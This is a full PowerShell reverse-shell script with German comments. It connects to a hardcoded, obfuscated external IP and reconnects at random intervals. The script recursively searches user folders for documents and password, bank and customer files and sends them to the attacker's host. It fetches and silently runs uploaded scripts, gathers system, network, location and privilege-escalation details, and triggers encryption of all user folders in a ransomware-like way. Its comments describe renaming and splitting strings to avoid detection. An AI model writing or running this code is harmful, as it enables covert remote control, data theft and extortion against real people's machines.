# Obfuskierter PowerShell-Reverse-Shell (verbessert für leiseren Recon, mit Prompt-Fix)
# Alle IPs, Ports, Pfade obfuskiert durch Concatenation.
# Funktionsnamen geändert zu randomisierten (z.B. FnGk1, FnTd2, FnRe3).
# Variablennamen randomisiert (z.B. vDh für DOWNLOAD_HOST, vCk für CurrentKey etc.).
# Änderungen: Initialer Enum entfernt; Recon in dedizierte Befehle geklustert; Help aktualisiert; Prompt dynamisch nach jedem Befehl.

$a = '145'; $b = '223'; $c = '117'; $d = '77'; $obfIp = $a + '.' + $b + '.' + $c + '.' + $d
$pDl = [int]('4'+'4'+'4'+'4')
$pUl = [int]('4'+'4'+'4'+'5')
$pMn = [int]('4'+'4'+'3')
$hdP1 = 'Micro'; $hdP2 = 'soft'; $hdP3 = '\Win'; $hdP4 = 'dows\Power'; $hdP5 = 'Shell\oper'; $hdP6 = 'ation'
$vHd = Join-Path -Path $env:APPDATA -ChildPath ($hdP1 + $hdP2 + $hdP3 + $hdP4 + $hdP5 + $hdP6)
$esP1 = '\Docu'; $esP2 = 'ments\Win'; $esP3 = 'dowsCea'; $esP4 = 'sar.ps1'
$vEs = "$env:USERPROFILE" + $esP1 + $esP2 + $esP3 + $esP4
$vCk = 't' + 'e' + 's' + 't'

function FnGk1 {
    param ([string]$p1, [byte[]]$s1)
    $kd = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($p1, $s1, 100000)
    $k = $kd.GetBytes(32)
    return $k
}

function FnTd2 {
    param ([string]$fp, [string]$p1 = $vCk)
    try {
        $fp = (Resolve-Path $fp -ErrorAction Stop).Path
        if ($fp -notlike '*.enc') { return $fp }
        $ed = [System.IO.File]::ReadAllBytes($fp)
        if ($ed.Length -lt 32) { throw 'Datei zu klein.' }
        $s1 = $ed[0..15]
        $iv = $ed[16..31]
        $ct = $ed[32..($ed.Length - 1)]
        $k = FnGk1 $p1 $s1
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $k
        $aes.IV = $iv
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $dec = $aes.CreateDecryptor()
        $ms = New-Object System.IO.MemoryStream($ct, 0, $ct.Length)
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $dec, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $ds = New-Object System.IO.MemoryStream
        $cs.CopyTo($ds)
        $db = $ds.ToArray()
        $tp = Join-Path -Path $env:TEMP -ChildPath ([System.IO.Path]::GetRandomFileName())
        [System.IO.File]::WriteAllBytes($tp, $db)
        $cs.Close(); $ms.Close(); $ds.Close()
        return $tp
    } catch {
        throw "Entschlüsselungsfehler: $_"
    }
}

function FnRe3 {
    param ([string]$tp, [string]$oep, [string]$p1 = $vCk)
    try {
        $oep = (Resolve-Path $oep -ErrorAction Stop).Path
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $s1 = New-Object byte[] 16; $rng.GetBytes($s1)
        $k = FnGk1 $p1 $s1
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $k
        $iv = New-Object byte[] 16; $rng.GetBytes($iv)
        $aes.IV = $iv
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $enc = $aes.CreateEncryptor()
        $fs = [System.IO.File]::OpenRead($tp)
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $enc, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $fs.CopyTo($cs)
        $cs.FlushFinalBlock()
        $eb = $ms.ToArray()
        $ed = $s1 + $iv + $eb
        [System.IO.File]::WriteAllBytes($oep, $ed)
        $fs.Close(); $cs.Close(); $ms.Close()
        Remove-Item $tp -Force
    } catch {
        throw "Verschlüsselungsfehler: $_"
    }
}

$vDh = $obfIp
$vDp = $pDl
$vUh = $obfIp
$vUp = $pUl

while ($true) {
    try {
        $vCl = New-Object System.Net.Sockets.TCPClient($obfIp, $pMn)
        $vSt = $vCl.GetStream()
        $vWr = New-Object System.IO.StreamWriter($vSt)
        $vRd = New-Object System.IO.StreamReader($vSt)
        $vWr.AutoFlush = $true
        $vWr.WriteLine("--- Shell verbunden ---")
        $vPm = "PS " + (Get-Location).Path + "> "  # Initialer Prompt
        $vWr.Write($vPm)
        while ($vCl.Connected) {
            $vCm = $vRd.ReadLine()
            if ($vCm -eq $null -or $vCm.ToLower() -eq "exit") { break }
            $vOt = ""
            try {
                if ($vCm.ToLower() -eq "help" -or $vCm.ToLower() -eq "-h") {
                    $vOt = @"
Verfuegbare Befehle in dieser Reverse-Shell:
Befehl | Syntax / Beispiel | Beschreibung
----------------------- | -------------------------------------------------------- | ------------
help / -h | help | Zeigt diese Hilfe an
cd | cd <Pfad> (z.B. cd C:\Users) | Wechselt das Verzeichnis (absolut/relativ); cd ohne Pfad -> Userprofile
cat | cat <Datei> [<key>] (z.B. cat flag.txt MeinKey) | Liest den Inhalt einer Datei und sendet ihn zeilenweise (Textdateien, temporaer entschlÃ¼sselt falls noetig mit Key; Fallback: CurrentKey/test)
download | download <Datei> [<key>] (z.B. download C:\secret.exe MeinKey) | Laedt jede Datei (Text/Binaer) chunked & base64-encodiert herunter (temporaer entschlÃ¼sselt falls noetig mit Key; Fallback: CurrentKey/test)
upload | upload <Zielpfad> (z.B. upload "$vHd\news.ps1")| Lädt Datei vom Attacker hoch (chunked). Starte auf Attacker: python upload_server.py local.ps1. Bei .ps1 im operation-Ordner automatisch hidden gestartet.
execute | execute <Dateipfad> (z.B. execute test.ps1) | Führt .ps1-Datei asynchron aus (im Hintergrund, ohne zu blocken) mit -NoProfile -NonInteractive -ExecutionPolicy Bypass.
search_sensitive | search_sensitive [<Pfad>] | Sucht rekursiv nach sensiblen Dateien (Docs, Excel, Passwoerter, Flags etc.) und sendet Inhalte im Klartext (Textdateien) oder via Download (Binaer). Optional: Startpfad (Default: Userprofile + Documents)
encrypt_full <key> | encrypt_full MeinKey | Verschluesselt alle user-Ordner (Full-Modus, mit Key; setzt CurrentKey)
decrypt_full <key> | decrypt_full MeinKey | Entschluesselt alle user-Ordner (Full-Modus, mit Key)
encrypt_select <path> <key> | encrypt_select C:\Users\adsfa\Downloads MeinKey | Verschluesselt einen spezifischen Ordner (Select-Modus, mit Key; setzt CurrentKey)
decrypt_select <path> <key> | decrypt_select C:\Users\adsfa\Downloads MeinKey | Entschluesselt einen spezifischen Ordner (Select-Modus, mit Key)
recon_system [-Verbose] | recon_system | Sammelt System-Infos (Hostname, OS, Laufwerke, Prozesse, Software)
recon_user [-Verbose] | recon_user | Sammelt Benutzer-Infos (User, Profile, Konten, E-Mail/Pass-Hinweise)
recon_network [-Verbose] | recon_network | Sammelt Netzwerk-Infos (IPs, Adapter, Gateway, ARP, WLAN)
recon_geolocation [-Verbose] | recon_geolocation | Sammelt Geolocation-Infos (Public IP, Geo-Daten – erfordert Internet)
recon_privesc [-Verbose] | recon_privesc | Sammelt Privesc-Checks (Privilegien, Patches, ACLs, Vektoren)
recon_all [-Verbose] | recon_all | Führt alle Recon-Cluster aus (Voll-Enum, aber on-demand)
exit | exit | Beendet die Shell sauber (keine Wiederverbindung)
Andere Befehle | <beliebiger PowerShell-Befehl> (z.B. whoami, dir) | Fuehrt normale PowerShell-Befehle aus
Tipp: Verwende Anfuehrungszeichen bei Pfaden mit Leerzeichen. Für upload .ps1 in "$vHd\" wird es automatisch hidden gestartet. CurrentKey: $vCk (letzter encrypt-Key). Bei falschem Key bei cat/download wirft es Padding-Fehler.
"@
                } elseif ($vCm -like "recon_system*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### System-Infos`n"
                    $vEo += "Hostname: " + $env:COMPUTERNAME + "`n"
                    $vEo += "OS-Version: " + (Get-WmiObject Win32_OperatingSystem).Caption + " (Build: " + (Get-WmiObject Win32_OperatingSystem).BuildNumber + ")`n"
                    $vEo += "Architektur: " + $env:PROCESSOR_ARCHITECTURE + "`n"
                    $vEo += "Timezone/Location-Hinweis: " + [System.TimeZoneInfo]::Local.DisplayName + "`n"
                    $vEo += "Aktuelles Verzeichnis: " + (Get-Location).Path + "`n"
                    $vEo += "Verfuegbare Laufwerke: " + (Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free | Out-String) + "`n"
                    $vEo += "Laufende Prozesse (Top 10): " + (Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Out-String) + "`n"
                    $vEo += "Installierte Software (High-Level): " + (Get-WmiObject Win32_Product | Select-Object Name, Version | Out-String) + "`n"
                    if ($vVb) { $vEo += "`nVerbose: System-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_user*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Benutzer-Infos`n"
                    $vEo += "Aktueller Benutzer: " + $env:USERNAME + "`n"
                    $vEo += "Vollstaendiger Name: " + (Get-WmiObject Win32_UserAccount -Filter "Name='$env:USERNAME'").FullName + "`n"
                    $vEo += "User-Profile-Pfad: " + $env:USERPROFILE + "`n"
                    $vEo += "Andere lokale User-Konten: " + (Get-LocalUser | Select-Object Name, Enabled, LastLogon | Out-String) + "`n"
                    try {
                        $eh = if (Test-Path "$env:USERPROFILE\AppData\Local\Microsoft\Outlook") { "Outlook-Profil vorhanden" } else { "Keine Outlook-Profile gefunden" }
                        $vEo += "E-Mail-Hinweise: " + $eh + "`n"
                    } catch {
                        $vEo += "E-Mail-Hinweise: Fehler: $_`n"
                    }
                    $vEo += "Passwort-Hinweise: Keine direkten Passwoerter (Admin-Rechte fuer SAM-Dump benoetigt). Ueberpruefe Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`n"
                    if ($vVb) { $vEo += "`nVerbose: User-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_network*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Netzwerk-Infos`n"
                    $vEo += "Interne IP-Adressen: " + (Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, AddressFamily | Out-String) + "`n"
                    $vEo += "Netzwerk-Adapter (WLAN/LAN): " + (Get-NetAdapter | Select-Object Name, Status, MacAddress, MediaType | Out-String) + "`n"
                    $vEo += "Gateway/DNS: " + (Get-NetRoute -AddressFamily IPv4 | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Select-Object NextHop | Out-String) + "DNS: " + (Get-DnsClientServerAddress | Select-Object InterfaceAlias, ServerAddresses | Out-String) + "`n"
                    $vEo += "Andere Geraete im Netzwerk (ARP-Tabelle): " + (Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State | Out-String) + "`n"
                    $vEo += "Verbundene WLAN-Netzwerke: " + (netsh wlan show profiles | Out-String) + "`n"
                    if ($vVb) { $vEo += "`nVerbose: Network-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_geolocation*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Geolocation-Infos`n"
                    try {
                        $pip = Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 5 | Select-Object -ExpandProperty Content
                        $vEo += "Public IP: $pip`n"
                        $gr = Invoke-WebRequest -Uri "https://ipinfo.io/$pip/json" -TimeoutSec 5
                        $gj = $gr.Content | ConvertFrom-Json
                        $vEo += "Geodaten:`n"
                        $vEo += " - Stadt: " + $gj.city + "`n"
                        $vEo += " - Region: " + $gj.region + "`n"
                        $vEo += " - Land: " + $gj.country + "`n"
                        $vEo += " - Postleitzahl: " + $gj.postal + "`n"
                        $vEo += " - Breitengrad/Laengengrad: " + $gj.loc + "`n"
                        $vEo += " - Timezone: " + $gj.timezone + "`n"
                        $vEo += " - ISP: " + $gj.org + "`n"
                        $vEo += " - Hostname: " + $gj.hostname + "`n"
                    } catch {
                        $vEo += "Geodaten: Konnte nicht abgerufen werden (Fehler: $_)`n"
                    }
                    if ($vVb) { $vEo += "`nVerbose: Geolocation-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_privesc*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vEo = "`n### Privilege Escalation Checks`n"
                    try {
                        $vEo += "Aktuelle Privilegien: " + (whoami /priv | Out-String) + "`n"
                        $vEo += "Systeminfo (fuer Patches/Hotfixes): " + (systeminfo | Select-String "Hotfix|OS Name|OS Version|System Type" | Out-String) + "`n"
                        $sv = Get-WmiObject Win32_Service | Where-Object { $_.PathName -and $_.PathName -notlike '"*"' -and $_.PathName -like '* *' }
                        if ($sv) {
                            $vEo += "Dienste mit unquoted Paths: " + ($sv | Select-Object Name, PathName | Out-String) + "`n"
                        } else {
                            $vEo += "Keine unquoted Service Paths gefunden.`n"
                        }
                        $wp = @("C:\Windows", "C:\Windows\System32", "HKLM:\SOFTWARE")
                        foreach ($p in $wp) {
                            try {
                                $acl = Get-Acl $p
                                $vEo += "Zugriffsrechte fuer ${p}: " + ($acl.Access | Where-Object { $_.IdentityReference -like "*$env:USERNAME*" -and $_.AccessControlType -eq "Allow" -and $_.FileSystemRights -match "Write|Modify|FullControl" } | Out-String) + "`n"
                            } catch {
                                $vEo += "Fehler bei ACL-Check fuer ${p}: $_`n"
                            }
                        }
                        $vEo += "Potenzielle Privesc-Vektoren:`n - SeImpersonatePrivilege? -> JuicyPotato.`n - Unpatched? -> MS17-010 etc.`n - Writable Services? -> sc.exe qc.`n"
                    } catch {
                        $vEo += "Fehler bei Privesc-Checks: $_`n"
                    }
                    if ($vVb) { $vEo += "`nVerbose: Privesc-Enum abgeschlossen.`n" }
                    $vOt = $vEo
                } elseif ($vCm -like "recon_all*") {
                    $vVb = $vCm -like "* -Verbose"
                    $vOt = Invoke-Expression "recon_system $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_user $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_network $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_geolocation $(if($vVb){'-Verbose'})" + "`n" +
                           Invoke-Expression "recon_privesc $(if($vVb){'-Verbose'})" + "`n"
                    if ($vVb) { $vOt += "`nVerbose: Full Recon abgeschlossen.`n" }
                } elseif ($vCm -like "upload *") {
                    $vRp = $vCm.Substring(7).Trim()
                    if ([string]::IsNullOrWhiteSpace($vRp)) {
                        $vOt = "Verwendung: upload <Zielpfad-auf-Target>"
                    } else {
                        try {
                            $vDr = Split-Path $vRp -Parent
                            if ($vDr -and -not (Test-Path $vDr)) { New-Item -ItemType Directory -Force -Path $vDr | Out-Null }
                            $vUc = New-Object System.Net.Sockets.TCPClient($vUh, $vUp)
                            $vUs = $vUc.GetStream()
                            $vUw = New-Object System.IO.StreamWriter($vUs)
                            $vUr = New-Object System.IO.StreamReader($vUs)
                            $vUw.AutoFlush = $true
                            $vUw.WriteLine("UPLOAD_REQUEST $vRp")
                            $vFs = [System.IO.File]::OpenWrite($vRp)
                            $vBd = ""
                            $vIc = $false
                            while ($true) {
                                $vLn = $vUr.ReadLine()
                                if ($null -eq $vLn) { break }
                                if ($vLn -eq "BEGIN_UPLOAD") { $vOt = "Upload gestartet für $vRp..." }
                                elseif ($vLn -like "BEGIN_CHUNK*") { $vIc = $true; $vBd = "" }
                                elseif ($vLn -eq "END_CHUNK") {
                                    if ($vIc) { $cb = [System.Convert]::FromBase64String($vBd); $vFs.Write($cb, 0, $cb.Length); $vFs.Flush(); $vBd = "" }
                                    $vIc = $false
                                } elseif ($vLn -eq "END_UPLOAD") {
                                    $vFs.Close()
                                    $vOt += "`nUpload abgeschlossen: $vRp"
                                    if ($vRp -like "$vHd\*.ps1") {
                                        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$vRp`"" -WindowStyle Hidden
                                        $vOt += " Skript automatisch hidden gestartet."
                                    }
                                    break
                                } elseif ($vIc) { $vBd += $vLn }
                            }
                            $vUw.Close(); $vUr.Close(); $vUs.Close(); $vUc.Close()
                        } catch {
                            $vOt = "Upload-Fehler: $_"
                        }
                    }
                } elseif ($vCm -like "execute *") {
                    $vFp = $vCm.Substring(8).Trim()
                    if ([string]::IsNullOrWhiteSpace($vFp)) { $vOt = "Verwendung: execute <Pfad-zur-.ps1-Datei>" }
                    else {
                        try { $vFp = (Resolve-Path $vFp -ErrorAction Stop).Path } catch { $vOt = "Fehler: Pfad nicht auflösbar: $_"; continue }
                        if ((Test-Path $vFp -PathType Leaf) -and ($vFp -like "*.ps1")) {
                            try {
                                Start-Process powershell.exe -ArgumentList "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$vFp`"" -WindowStyle Hidden
                                $vOt = "Skript '$vFp' asynchron und hidden gestartet."
                            } catch { $vOt = "Fehler beim Starten: $_" }
                        } else { $vOt = "Fehler: Keine .ps1-Datei: $vFp" }
                    }
                } elseif ($vCm -like "download *") {
                    $vPt = $vCm -split ' ', 3
                    $vFp = $vPt[1].Trim()
                    $vRk = if ($vPt.Length -ge 3) { $vPt[2].Trim() } else { $vCk }
                    if ([string]::IsNullOrWhiteSpace($vFp)) { $vOt = "Verwendung: download <Pfad-zur-Datei> [<key>]" }
                    else {
                        try { $vFp = (Resolve-Path $vFp -ErrorAction Stop).Path } catch { $vOt = "Fehler: Datei nicht gefunden: $vFp"; continue }
                        try {
                            $fn = [System.IO.Path]::GetFileName($vFp) -replace ".enc$", ""
                            $we = $false
                            $vTp = $vFp
                            if ($vFp -like "*.enc") { $we = $true; $vTp = FnTd2 $vFp $vRk }
                            $vDc = New-Object System.Net.Sockets.TCPClient($vDh, $vDp)
                            $vDs = $vDc.GetStream()
                            $vDw = New-Object System.IO.StreamWriter($vDs)
                            $vDw.AutoFlush = $true
                            $vDw.WriteLine("BEGIN_DOWNLOAD $fn")
                            $cs = 512KB
                            $vFs = [System.IO.File]::OpenRead($vTp)
                            $bf = New-Object byte[] $cs
                            $cn = 1
                            while ($br = $vFs.Read($bf, 0, $cs)) {
                                $cb = $bf[0..($br-1)]
                                $bc = [System.Convert]::ToBase64String($cb)
                                $vDw.WriteLine("BEGIN_CHUNK $cn")
                                $vDw.WriteLine($bc)
                                $vDw.WriteLine("END_CHUNK")
                                $cn++
                            }
                            $vFs.Close()
                            $vDw.WriteLine("END_DOWNLOAD")
                            $vDw.Close(); $vDs.Close(); $vDc.Close()
                            if ($we) { FnRe3 -tp $vTp -oep $vFp -p1 $vRk }
                            $vOt = "Download abgeschlossen: $fn"
                        } catch { $vOt = "Download-Fehler: $_" }
                    }
                } elseif ($vCm -like "cat *") {
                    $vPt = $vCm -split ' ', 3
                    $vFp = $vPt[1].Trim()
                    $vRk = if ($vPt.Length -ge 3) { $vPt[2].Trim() } else { $vCk }
                    if ([string]::IsNullOrWhiteSpace($vFp)) { $vOt = "Verwendung: cat <Pfad-zur-Datei> [<key>]" }
                    else {
                        try { $vFp = (Resolve-Path $vFp -ErrorAction Stop).Path } catch { $vOt = "Fehler: Datei nicht gefunden: $vFp"; continue }
                        try {
                            $we = $false
                            $vTp = $vFp
                            if ($vFp -like "*.enc") { $we = $true; $vTp = FnTd2 $vFp $vRk }
                            $vFs = [System.IO.File]::OpenText($vTp)
                            while ($null -ne ($vLn = $vFs.ReadLine())) { $vWr.WriteLine($vLn) }
                            $vFs.Close()
                            if ($we) { FnRe3 -tp $vTp -oep $vFp -p1 $vRk }
                            $vOt = ""
                        } catch { $vOt = "Fehler: $_" }
                    }
                } elseif ($vCm -like "cd *") {
                    $vPh = $vCm.Substring(3).Trim()
                    if ([string]::IsNullOrWhiteSpace($vPh)) { $vPh = $env:USERPROFILE }
                    Set-Location -Path $vPh -ErrorAction Stop
                    $vOt = "Verzeichnis gewechselt zu: " + (Get-Location).Path
                } elseif ($vCm -like "encrypt_full *") {
                    $vRk = $vCm.Substring(13).Trim()
                    $vCk = $vRk
                    if (Test-Path $vEs) { & $vEs -EncryptFull -Key $vRk; $vOt = "Full-Modus verschluesselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "decrypt_full *") {
                    $vRk = $vCm.Substring(13).Trim()
                    if (Test-Path $vEs) { & $vEs -DecryptFull -Key $vRk; $vOt = "Full-Modus entschlÃ¼sselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "encrypt_select *") {
                    $vPt = $vCm -split ' ', 3
                    $vSp = $vPt[1].Trim()
                    $vRk = $vPt[2].Trim()
                    $vCk = $vRk
                    if (Test-Path $vEs) { & $vEs -EncryptSelect $vSp -Key $vRk; $vOt = "Select-Modus verschluesselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "decrypt_select *") {
                    $vPt = $vCm -split ' ', 3
                    $vSp = $vPt[1].Trim()
                    $vRk = $vPt[2].Trim()
                    if (Test-Path $vEs) { & $vEs -DecryptSelect $vSp -Key $vRk; $vOt = "Select-Modus entschlÃ¼sselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                } elseif ($vCm -like "search_sensitive*") {
                    $vSp = if ($vCm -like "search_sensitive *") { $vCm.Substring(17).Trim() } else { "" }
                    if ([string]::IsNullOrWhiteSpace($vSp)) {
                        $vSps = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\AppData\Roaming", "C:\Users\Public\Documents")
                    } else { $vSps = @($vSp) }
                    $vFp = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*password*", "*pass*", "*flag*", "*ctf*", "*credit*", "*bank*", "*customer*", "*kunden*")
                    $vOt += "Suche in: $($vSps -join ', ') | Muster: $($vFp -join ', ')`n`n"
                    foreach ($p in $vSps) {
                        try { $p = (Resolve-Path $p -ErrorAction Stop).Path } catch { $vOt += "Fehler Pfad ${p}: $_`n"; continue }
                        if (Test-Path $p) {
                            $ff = Get-ChildItem -Path $p -Recurse -Include $vFp -Exclude "*.lnk" -File -ErrorAction SilentlyContinue
                            if ($ff.Count -gt 0) {
                                $vOt += "### Gefundene in $p ($($ff.Count)):`n"
                                foreach ($f in $ff) {
                                    $vOt += "- $($f.FullName) (Größe: $($f.Length))`n"
                                    try {
                                        if ($f.Extension -in @(".txt", ".log", ".ini", ".conf", ".flag")) {
                                            $vWr.WriteLine("BEGIN_TEXT_EXFIL $($f.Name)")
                                            $vFs = [System.IO.File]::OpenText($f.FullName)
                                            while ($null -ne ($vLn = $vFs.ReadLine())) { $vWr.WriteLine($vLn) }
                                            $vFs.Close()
                                            $vWr.WriteLine("END_TEXT_EXFIL")
                                            $vOt += " -> Klartext gesendet.`n"
                                        } else {
                                            $vDc = New-Object System.Net.Sockets.TCPClient($vDh, $vDp)
                                            $vDs = $vDc.GetStream()
                                            $vDw = New-Object System.IO.StreamWriter($vDs)
                                            $vDw.AutoFlush = $true
                                            $vDw.WriteLine("BEGIN_DOWNLOAD $($f.Name)")
                                            $cs = 1MB
                                            $vFs = [System.IO.File]::OpenRead($f.FullName)
                                            $bf = New-Object byte[] $cs
                                            $cn = 1
                                            while ($br = $vFs.Read($bf, 0, $cs)) {
                                                $cb = $bf[0..($br-1)]
                                                $bc = [System.Convert]::ToBase64String($cb)
                                                $vDw.WriteLine("BEGIN_CHUNK $cn")
                                                $vDw.WriteLine($bc)
                                                $vDw.WriteLine("END_CHUNK")
                                                $cn++
                                            }
                                            $vFs.Close()
                                            $vDw.WriteLine("END_DOWNLOAD")
                                            $vDw.Close(); $vDs.Close(); $vDc.Close()
                                            $vOt += " -> Gesendet via Download.`n"
                                        }
                                    } catch { $vOt += " -> Exfil-Fehler: $_`n" }
                                }
                            } else { $vOt += "Keine in $p.`n" }
                        } else { $vOt += "Pfad $p existiert nicht.`n" }
                    }
                    $vOt += "`n--- Suche abgeschlossen ---`n"
                } else {
                    $vOt = Invoke-Expression -Command $vCm 2>&1 | Out-String
                }
            } catch {
                $vOt = "Fehler: $_"
            }
            # Dynamischer Prompt: Nach jedem Befehl neu berechnen
            $vPm = "PS " + (Get-Location).Path + "> "
            $vWr.Write($vOt + "`n" + $vPm)
        }
    } catch {
        Write-Output "Verbindungsfehler: $_ - Wiederverbindung..."
    } finally {
        @($vWr, $vRd, $vSt, $vCl) | Where-Object { $_ -ne $null } | ForEach-Object { try { $_.Close() } catch {} }
    }
    if ($vCm -ne "exit") {
        $vDy = Get-Random -Minimum 1 -Maximum 14
        Write-Output "Warte $vDy Sekunden..."
        Start-Sleep -Seconds $vDy
    } else { break }
}